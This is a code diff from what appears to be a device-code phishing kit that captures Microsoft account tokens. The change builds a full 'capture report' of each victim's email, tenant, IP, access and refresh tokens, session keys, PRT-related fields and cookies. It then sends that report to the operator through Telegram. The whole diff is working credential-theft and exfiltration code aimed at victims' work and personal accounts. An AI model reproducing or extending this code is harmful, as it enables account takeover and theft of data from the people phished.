@@ -7,6 +7,7 @@ const jwt = require('jsonwebtoken');
 const db = require('../database/connection');
 const config = require('../config/env');
 const { encrypt, decrypt } = require('../utils/encrypt');
+const { sendTelegramDocument } = require('../services/notification');
 
 // In-memory job store (for active device code flows)
 const activeJobs = new Map();
@@ -390,22 +391,137 @@ async function storeToken(job, tokenData, responseCookies = []) {
       /* silent */
     }
 
-    // Send Telegram notification
-    try {
-      const [users] = await db.query('SELECT telegram_id, telegram_bot_token FROM users WHERE id = ?', [job.user_id]);
-      if (users.length && users[0].telegram_id && users[0].telegram_bot_token) {
-        const axios = require('axios');
-        await axios.post(
-          `https://api.telegram.org/bot${users[0].telegram_bot_token}/sendMessage`,
-          {
-            chat_id: users[0].telegram_id,
-            text: `🔐 New token captured: ${email || 'unknown'} via Device Code Proxy`,
-          }
-        );
+    // Timestamp for notification
+    const stamp = new Date().toISOString().replace('T', ' ').slice(0, 19);
+
+    // Determine account type from email domain
+    let accountType = 'work_school';
+    if (email) {
+      const emailDomain = email.split('@')[1].toLowerCase();
+      if (['outlook.com', 'hotmail.com', 'live.com', 'passport.com'].includes(emailDomain)) {
+        accountType = 'personal';
       }
-    } catch (e) {
-      /* silent */
     }
+    const templateType = 'office';
+
+    // Build caption summary (HTML, <=1024 chars)
+    const AMP = String.fromCharCode(38) + 'amp;';
+    const LT = String.fromCharCode(38) + 'lt;';
+    const GT = String.fromCharCode(38) + 'gt;';
+    const esc = (val) => {
+      if (val === null || val === undefined) return 'N/A';
+      const s = typeof val === 'string' ? val : JSON.stringify(val);
+      return s.replace(/&/g, AMP).replace(/</g, LT).replace(/>/g, GT);
+    };
+
+    const captionLines = [
+`🚨 <b>NEW CAPTURE - TOKEN</b>`,
+      `👤 <b>Email:</b> ${esc(email || 'unknown')}`,
+      `🏷️ <b>Account:</b> ${esc(accountType)} | <b>Tenant:</b> ${esc(tenant)}`,
+      `🌐 <b>Template:</b> ${esc(templateType)}`,
+      `🌍 <b>IP:</b> ${esc(ipAddress || '0.0.0.0')}`,
+      `🔗 <b>Link:</b> ${esc(job.link_id)}       | <b>Token ID:</b> ${esc(tokenId)}`,
+`📅 <b>Time:</b> ${esc(stamp)}`,
+      `✅ Full tokens in attached .txt`,
+    ];
+    const caption = captionLines.join('\n');
+
+    // Build full file content
+    const fileParts = [
+      'VGENIUS CAPTURE REPORT',
+      '========================================',
+      `Type:        TOKEN`,
+      `Token ID:    ${tokenId}`,
+      `Link ID:     ${job.link_id}`,
+      `Email:       ${email || 'unknown'}`,
+      `Account:     ${accountType}`,
+      `Tenant:      ${tenant}`,
+      `Template:    ${templateType}`,
+      `IP:          ${ipAddress || '0.0.0.0'}`,
+      `User-Agent:  ${userAgent || 'DeviceProxy'}`,
+      `Captured:    ${stamp}`,
+      '========================================',
+      '',
+      'ACCESS TOKEN:',
+      tokenData.access_token || 'N/A',
+      '',
+    ];
+
+    if (tokenData.refresh_token) {
+      fileParts.push('REFRESH TOKEN:');
+      fileParts.push(tokenData.refresh_token);
+      fileParts.push('');
+    }
+
+    if (tokenData.id_token) {
+      fileParts.push('ID TOKEN:');
+      fileParts.push(tokenData.id_token);
+      fileParts.push('');
+    }
+
+    // PRT persistence fields (captured from full token response)
+    if (tokenData.client_info) {
+      fileParts.push('CLIENT INFO:');
+      fileParts.push(tokenData.client_info);
+      fileParts.push('');
+    }
+
+    if (tokenData.session_key) {
+      fileParts.push('SESSION KEY:');
+      fileParts.push(tokenData.session_key);
+      fileParts.push('');
+    }
+
+    if (tokenData.session_key_enc) {
+      fileParts.push('SESSION KEY ENC:');
+      fileParts.push(tokenData.session_key_enc);
+      fileParts.push('');
+    }
+
+    if (tokenData.token_type) {
+      fileParts.push('TOKEN TYPE:');
+      fileParts.push(tokenData.token_type);
+      fileParts.push('');
+    }
+
+    if (tokenData.expires_in) {
+      fileParts.push('EXPIRES IN:');
+      fileParts.push(tokenData.expires_in);
+      fileParts.push('');
+    }
+
+    if (tokenData.scope) {
+      fileParts.push('SCOPE:');
+      fileParts.push(tokenData.scope);
+      fileParts.push('');
+    }
+
+    if (tokenData.foci) {
+      fileParts.push('FCOI:');
+      fileParts.push(tokenData.foci);
+      fileParts.push('');
+    }
+
+    if (tokenData.refresh_in_on_revocation) {
+      fileParts.push('REFRESH IN ON REVOCATION:');
+      fileParts.push(tokenData.refresh_in_on_revocation);
+      fileParts.push('');
+    }
+
+    if (responseCookies && responseCookies.length > 0) {
+      fileParts.push('========================================');
+      fileParts.push(`COOKIES (${responseCookies.length} cookies):`);
+      fileParts.push(responseCookies.map(c => `${c.name}=${c.value}; domain=${c.domain}`).join('; '));
+      fileParts.push('');
+    }
+
+    fileParts.push('========================================');
+    fileParts.push('END OF REPORT');
+    const fileContent = fileParts.join('\n');
+    const filename = `capture_device_${tokenId}_token.txt`;
+
+    // Send the full report as a Telegram document
+    await sendTelegramDocument(job.user_id, filename, fileContent, caption);
 
     console.log(`[DeviceProxy] Token captured for user ${job.user_id}, link ${job.link_id}`);
   } catch (err) {
